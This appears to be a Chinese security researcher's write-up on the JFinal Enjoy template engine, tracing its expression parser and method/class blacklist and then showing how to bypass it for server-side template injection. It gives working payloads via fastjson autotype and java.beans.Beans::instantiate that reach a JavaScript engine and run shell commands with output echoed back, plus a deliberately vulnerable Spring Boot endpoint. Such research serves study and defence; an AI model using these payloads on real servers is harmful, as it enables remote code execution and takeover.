@Y4tacker
Enjoy模板引擎分析
前置
⾸先有关Enjoy模板引擎的⼀些描述可以看这⾥：https://jfinal.com/doc/6-1
⽂档中值得关注的点
属性访问触发get⽅法  
在官⽅⽂档⾥⾯我们可以看到很多有趣的东西(当然我会更关注于⼀些相关的)，⽐如属性访问
的这⼀条描述，可以让我们去触发对象的get⽅法(前提是public修饰)
⽅法调⽤  
由于模板引擎的属性取值表达式极为常⽤，所以对其在⽤户体验上进⾏了符合直觉的扩展，field 表
达式取值优先次序，以 user.name 为例：
如果 user.getName() 存在，则优先调⽤
如果 user 具有 public 修饰过的name 属性，则取 user.name 属性值（注意：jfinal 4.0 
之前这条规则的优先级最低）
关于⽅法调⽤也有⼀些描述，说可以直接调⽤对象上的任何public⽅法，使⽤规则与java中调
⽤⽅式保持⼀致，当然也不是所有⽅法都能调⽤，在源码的调试过程当中发现有⼀些⽅法在
⿊名单当中
除此以外也有⿊名单类
getClass
wait
notifyAll
getClassLoader
invoke
notify
getDeclaringClass
removeForbiddenMethod
removeForbiddenClass
suspend
resume
loadLibrary
forName
newInstance
exit
halt
stop
java.lang.ThreadGroup
java.lang.ProcessBuilder
java.lang.System
java.lang.ClassLoader
java.lang.reflect.Proxy
java.lang.Runtime
java.lang.Thread
java.lang.Class
com.jfinal.template.expr.ast.MethodKit
java.io.File
java.lang.reflect.Method
java.lang.InheritableThreadLocal
java.lang.Process
因此也给了我们更多的限制
静态属性访问  
来个例⼦就懂了
静态⽅法的调⽤  
同时⽀持调⽤静态属性上的⽅法
引擎执⾏流程简单分析
java.lang.ThreadLocal
java.lang.Package
java.lang.SecurityManager
java.lang.Compiler
java.lang.RuntimePermission
#if(x.status == com.demo.common.model.Account::STATUS_LOCK_ID)
   (账号已锁定)
#end
#if(com.jfinal.kit.StrKit::isBlank(title))
   ....
#end
(com.jfinal.MyKit::me).method(paras)
以下不感兴趣可以直接略过，因为不需要⼀些很详细的分析就能bypass，只要我们知道过滤了
哪些类哪些⽅法针对绕过即可，这⾥权当⾃⼰好奇看看如何实现的，当然分析也只会主要去
看⼀些能让我成功实现执⾏不安全函数的⽅式(指的是 #() 与 #set() 两种)，根据对⽂档的阅
读，个⼈认为其他标签对于我意义不⼤，因为我如果能够执⾏⼀个命令我需要的是能够回显 #
() ，或者我不能通过⼀步执⾏需要通过 #set(a=xxx) 的⽅式去拆分保存变量做中转，因此
我在分析调试的过程当中只会针对这两个标签进⾏分析
为了独⽴分析这⾥引⼊了maven坐标
⼀个基本的使⽤很简单，为了⽅便调试我写了个很简单的类
⾸先由于默认未开启缓存，默认⾛第⼀个分⽀
  com.jfinal
  enjoy
  4.9.21
package com.example.ezsb;
public class User {
    public static void run(){
        try{
            Runtime.getRuntime().exec("open -na Calculator");
        }catch (Exception e){
        }
    }
}
Template template = engine.getTemplateByString("#
(com.example.ezsb.User::run())");
template.renderToString();
接下来我们看 com.jfinal.template.Engine#buildTemplateBySource ,同样我们只需要
更关注于解析部分也就是 parser.parse()
接下来我们先跟⼀下这个遍历字符串解析token的过程，⾸先是初步解析操作与内容，⽐如 #
(xxx) 他就会识别成 OUTPUT xxxx ) 三部分， #set("a=xxx") 也会拆分成 set a=xxx )
三部分 之后在statlist中，根据
是 TEXT\SET\FOR\OUTPUT\INCLUDE\FOR\DEFINE\CALL..... 等去做更进⼀步的解析
这⾥我们看看,⾸先当前位置⼀定是 # ，不然也没意义了，这⾥光看英⽂单词就知道我们更应
该专注看 com.jfinal.template.stat.Lexer#scanDire
这⾥如果 # 后⾯是 ( 也就直接对应了 OUTPUT ，如果不是则判断后⾯如果是字母则转到state为
10的分⽀（PS：后⾯那个如果是@则调⽤模板函数防⽌你们好奇），并设置对应的token
接下来我们看看state为10的地⽅做的什么⾸先通过id去获取symbol
简单看看这⾥⼀些内置的东西，如果没有的话就会去看是不是⾛define或者else if分⽀，当然
超纲了我上⾯说过的只看 #() 和 #set() ，这⾥就不深⼊谈了
接下来看debug窗⼜就和我们上⾯说的⼀样设置了下⾯的toknelist的内容
接下来我们继续看看 statList 函数(在上⼀步的基础上进⾏更进⼀步的解析)，这⾥不管
是 OUTPUT 还是 SET 其实值得我们关注的核⼼调⽤是相同的，也就
是 this.parseExprList(para)
跟进 parseExprList ，⼀直到 com.jfinal.template.expr.ExprParser#parse ，我们
跟进这个scan
这⾥不再通篇像上⾯那样说如何解析的了，有兴趣可以⾃⼰看
这⾥我们只看⼏个关键的，在scanOperator⾥⾯，⼀个是 :: 作为STATIC静态标记，另⼀个是
左括号和又括号
在最终做完这些处理后，tokenList成了这个样⼦
接下来我们看看下⾯，⾸先initPeek会将peek设置为tokenList当中的第⼀个，之后默认会调
⽤ exprList
    Expr parse(boolean isExprList) {
        this.tokenList = (new ExprLexer(this.paraToken, 
this.location)).scan();
        if (this.tokenList.size() == 0) {
            return ExprList.NULL_EXPR_LIST;
        } else {
            this.tokenList.add(EOF);
            this.initPeek();
            Expr expr = isExprList ? this.exprList() : this.forCtrl();
            if (this.peek() != EOF) {
                throw new ParseException("Expression error: can not match 
\"" + this.peek().value() + "\"", this.location);
            } else {
                return (Expr)expr;
            }
        }
    }
在exprList,具体的过程也⽐较复杂
这⾥放⼀个调⽤栈就好了，有兴趣可以⾃⼰跟⼀跟(它规定了以什么样的顺序去解析我们的表
达式)
ExprList exprList() {
        ArrayList exprList = new ArrayList();
        while(true) {
            Expr expr = this.expr();
            if (expr == null) {
                break;
            }
            exprList.add(expr);
            if (this.peek().sym != Sym.COMMA) {
                break;
            }
            this.move();
            if (this.peek() == EOF) {
                throw new ParseException("Expression error: can not match 
the char of comma ','", this.location);
            }
        }
        return new ExprList(exprList);
    }
staticMember:326, ExprParser (com.jfinal.template.expr)
incDec:287, ExprParser (com.jfinal.template.expr)
unary:279, ExprParser (com.jfinal.template.expr)
nullSafe:253, ExprParser (com.jfinal.template.expr)
mulDivMod:241, ExprParser (com.jfinal.template.expr)
addSub:229, ExprParser (com.jfinal.template.expr)
greaterLess:216, ExprParser (com.jfinal.template.expr)
equalNotEqual:203, ExprParser (com.jfinal.template.expr)
最终在staticMember会返回⼀个实例化的staticMember对象
and:191, ExprParser (com.jfinal.template.expr)
or:179, ExprParser (com.jfinal.template.expr)
ternary:165, ExprParser (com.jfinal.template.expr)
assign:158, ExprParser (com.jfinal.template.expr)
expr:127, ExprParser (com.jfinal.template.expr)
exprList:110, ExprParser (com.jfinal.template.expr)
parse:97, ExprParser (com.jfinal.template.expr)
parseExprList:76, ExprParser (com.jfinal.template.expr)
parseExprList:269, Parser (com.jfinal.template.stat)
stat:117, Parser (com.jfinal.template.stat)
statList:87, Parser (com.jfinal.template.stat)
parse:77, Parser (com.jfinal.template.stat)
buildTemplateBySource:305, Engine (com.jfinal.template)
getTemplateByString:242, Engine (com.jfinal.template)
getTemplateByString:223, Engine (com.jfinal.template)
main:50, Test (com.example.ezsb)
在初始化的时候还会检查类名与⽅法名是否在⿊名单当中，具体的在上⾯提到过就不贴了点
我直达
后⾯过程就省略了，已经到了我们想要的了，后⾯就是如何调⽤这个静态函数了，当然其实
不⽌能调⽤静态⽅法，还可以直接调⽤实例对象的⽅法，但是也是有⿊名单拦截
绕过Bypass
根据之前的调试我们知道，如果想要在模板⾥⾯执⾏函数有⼏个条件
对于调⽤静态⽅法，只能调⽤公共静态⽅法(但不能⽤⿊名单当中的类以及⽅法)
对于实例对象的⽅法，只能调⽤public修饰的(但不能⽤⿊名单当中的类以及⽅法)
绕过第⼀个⽅式直接命令执⾏⽐较难，那么如果是第⼆种⽅式的话那我们肯定需要获取⼀个
类的实例，那么有没有⼀个public类的静态⽅法能返回我们任意的实例呢，那就看看有没有办
法能够返回⼀个类的实例呢？这样就可以 javax.script.ScriptEngineManager来执⾏任意Java代码
(这样也⽐较好绕过⿊名单了)
⾸先⽹上搜了搜jfinal的历史，发现可以通过fastjson去实例化⼀个类，同时可以开启autotype，
构造payload长这样
既然这样那有没有jre当中的类可以实现类似的效果呢？答案是有
Java⾃带类绕过
我发现有⼀个类 java.beans.Beans
这个⽅法又臭又长，不过好在符合条件classLoader也不需要传，真舒服呀
#set(x=com.alibaba.fastjson.parser.ParserConfig::getGlobalInstance())
#(x.setAutoTypeSupport(true))
#(x.addAccept("javax.script.ScriptEngineManager"))
#set(a=com.alibaba.fastjson.JSON::parse('{"@type":"javax.script.ScriptEngi
neManager"}'))
#set(b=a.getEngineByName('js'))
#set(payload=xxxxxx)
#(b.eval(payload))
public static Object instantiate(ClassLoader cls, String beanName) throws 
IOException, ClassNotFoundException {
  return Beans.instantiate(cls, beanName, null, null);
}
if (cls == null) {
  try {
    cls = ClassLoader.getSystemClassLoader();
  } catch (SecurityException ex) {
    // We're not allowed to access the system class loader.
    // Drop through.
  }
}
因此配合这个类顺⼿拿下模板SSTI
获取回显
我们考虑两个场景，⼀个是直接执⾏，另⼀个return返回值
写⼊内存马
#set((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager
")).getEngineByExtension("js").eval("function test(){ return 
java.lang.Runtime};r=test();r.getRuntime().exec(\"open -na 
Calculator\")"))
既然能够执⾏任意代码了那肯定拿下内存马，这⾥启⼀个springboot环境测试，简单测试下
直接回显
很简单不需要讲了都，很常规payload
@ResponseBody
@RequestMapping("/")
public String abc(@RequestParam("base") String base)  {
  ProcessBuilder processBuilder = new ProcessBuilder();
  Engine engine = Engine.use();
  engine.setDevMode(true);
  engine.setToClassPathSourceFactory();
  Template template = engine.getTemplateByString(base);
  String result = template.renderToString();
  return result;
}
测试下
base=#
((java.beans.Beans::instantiate(null,"javax.script.ScriptEngineManager")).
getEngineByExtension("js").eval("var s = [3];s[0] = \"/bin/bash\";s[1] 
=\"-c\";s[2] = \"id\";var p =java.lang.Runtime.getRuntime().exec(s);var sc 
= new 
java.util.Scanner(p.getInputStream(),\"GBK\").useDelimiter(\"\\A\");var 
result = sc.hasNext() ? sc.next() : \"\";sc.close();result;"))